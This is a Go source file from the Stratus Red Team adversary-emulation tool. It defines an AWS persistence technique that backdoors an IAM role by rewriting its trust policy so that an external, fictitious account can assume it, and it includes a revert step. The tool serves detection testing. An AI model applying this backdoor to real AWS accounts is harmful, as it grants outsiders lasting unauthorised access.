package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
	"strings"
)

//go:embed main.tf
var tf []byte

//go:embed malicious_policy.json
var maliciousIamPolicy string

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.persistence.backdoor-iam-role",
		FriendlyName: "Backdoor an IAM Role",
		Description: `
Establishes persistence by backdooring an existing IAM role, allowing it to be assumed from an external AWS account.

Warm-up: 

- Create an IAM role.

Detonation: 

- Update the assume role policy of the IAM role to backdoor it, making it accessible from an external, fictitious AWS account:

<pre>
<code>
` + maliciousIamPolicy + `
</code>
</pre>
`,
		Platform:                   stratus.AWS,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string) error {
	roleName := params["role_name"]

	log.Println("Backdooring IAM role " + roleName + " by allowing sts:AssumeRole from an external AWS account")
	err := updateAssumeRolePolicy(roleName, maliciousIamPolicy)
	if err != nil {
		return errors.New("unable to backdoor IAM role: " + err.Error())
	}
	return nil
}

func revert(params map[string]string) error {
	roleName := params["role_name"]
	roleTrustPolicy := strings.ReplaceAll(params["role_trust_policy"], "\\", "") // Terraform output adds backslashes for some reason

	log.Println("Reverting trust policy of IAM role " + roleName + " to its original state")
	err := updateAssumeRolePolicy(roleName, roleTrustPolicy)

	if err != nil {
		return errors.New("unable to backdoor IAM role: " + err.Error())
	}
	return nil
}

func updateAssumeRolePolicy(roleName string, roleTrustPolicy string) error {
	iamClient := iam.NewFromConfig(providers.AWS().GetConnection())
	_, err := iamClient.UpdateAssumeRolePolicy(context.Background(), &iam.UpdateAssumeRolePolicyInput{
		RoleName:       &roleName,
		PolicyDocument: &roleTrustPolicy,
	})
	return err
}
